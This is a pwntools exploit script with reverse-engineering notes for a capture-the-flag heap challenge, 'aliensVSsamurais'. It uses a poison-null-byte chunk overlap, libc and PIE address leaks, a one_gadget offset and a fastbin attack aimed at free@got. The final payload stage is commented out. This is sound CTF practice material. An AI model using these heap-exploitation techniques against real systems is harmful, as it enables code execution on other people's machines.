#!/usr/bin/env python3

from pwn import *

exe = ELF("./aliensVSsamurais")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def new_samurai(name):
    	r.sendline("1")
    	r.recvuntil("What is my weapon's name?")
    	r.sendline(name)

    def quit_dojo():
    	r.sendline("3")

    def new_alien(size, name):
    	r.sendline("1")
    	r.recvuntil("How long is my name?")
    	r.sendline(str(size))
    	r.recvuntil("What is my name?")
    	r.send(name)

    def consume_alien(idx):
    	r.sendline("2")
    	r.recvuntil("Which alien is unsatisfactory, brood mother?")
    	r.sendline(str(idx))

    def rename_alien(idx, data = ""):
    	r.sendline("3")
    	r.recvuntil("Brood mother, which one of my babies would you like to rename?")
    	r.sendline(str(idx))

    	if data == "":
    		r.recvuntil("Oh great what would you like to rename ")
    		leak = u64(r.recvn(6) + "\x00\x00")
    		r.send(p64(leak)[:7])
    		return leak
    	else:
    		r.send(data)


    new_samurai("katana1")
    new_samurai("katana2")
    quit_dojo()

    [new_alien(0x10, "S"*0x10) for i in range(2)]
    consume_alien(0)
    consume_alien(1)

    new_alien(0x80, "A"*0x80) # 2
    new_alien(0x60, "B"*0x60) # 3
    new_alien(0xf0, "C"*0xf0) # 4
    new_alien(0x80, "D"*0x80) # 5

    consume_alien(2)
    consume_alien(3)
    new_alien(0x68, "B"*0x60 + p64(0x100)) # 6
    consume_alien(4)
    new_alien(0x80, "A"*0x80) # 7

    libc_leak = rename_alien(6, "")
    libc.address = libc_leak - 0x3c4b78
    one_gadget = libc.address + 0x45216 #0x4526a ; 0xf02a4 ; 0xf1147
    log.info("libc_leak: {}".format(hex(libc_leak)))
    log.info("libc base address: {}".format(hex(libc.address)))

    pie_leak = rename_alien(-10, "")
    exe.address = pie_leak - 0x202070
    log.info("pie_leak: {}".format(hex(pie_leak)))
    log.info("elf base address: {}".format(hex(exe.address)))
    log.info("free@got: {}".format(hex(exe.got['free'])))

    r.send("\n")
    new_alien(0x60, "B"*0x60) # 8
    consume_alien(6)
    rename_alien(8, p64(exe.got['free'] - 0x13))

    #new_alien(0x60, "S"*0x60) # 9
    #new_alien(0x60, "\x00"*0x3 + p64(one_gadget) + "\x00"*(0x60-0x3-0x8)) # 10
    

    gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled


dojo
	- 1) new_samurai
		- malloc(0x10) ; [1] = 0x10 , [0] =  swords + samurai_index * 8
		- fgets(swords + samurai_index * 8,8,stdin);
		  samurai_index = samurai_index + 1;
  		  *(undefined8 **)(samurais + lVar1) = puVar2;
	
	- 2) seppuku
		- asks for index
		if (samurai_index < uVar1) // off-by-one?
		kill_samurai(uVar1)
			  free(*(void **)(samurais + param_1 * 8));
  			  *(undefined8 *)(samurais + param_1 * 8) = 0;

	- 3) quit
hatchery
	- 1) new_alien
		if (alien_index < 200)
		if (__malloc_hook == saved_malloc_hook)
		- input size - has to be >= 8
		- malloc(0x10) -  [0] = malloc(size), [1] = 0x100
		- malloc(size)
		- read(0,*ppvVar2,__size)
		- poison null byte *(undefined *)((long)(int)sVar4 + (long)*ppvVar2) = 0;

		lVar1 = alien_index * 8;
        alien_index = alien_index + 1;
        *(void ***)(aliens + lVar1) = ppvVar2;
	
	- 2) consume_alien
		- asks for index
		if (alien_index < uVar1) // off-by-one?
		if (__free_hook == saved_free_hook)
			kill_alien(uVar1);
				- frees malloc(size) chunk
				- frees malloc(0x10) chunk
				*(undefined8 *)(aliens + param_1 * 8) = 0;

	- 3) rename_alien
		- asks for index
		- prints name // infoleak
		- overwrites 8 bytes and appends null byte - another poison null byte?

	- 4) exit


invasion
	  lmao

Have to overwrite __free_hook and also get to win()

win() - if (*(ulong *)(*(long *)(aliens + i * 8) + 8) < *(ulong *)(*(long *)(samurais + i * 8) + 8))
	  - need only one
'''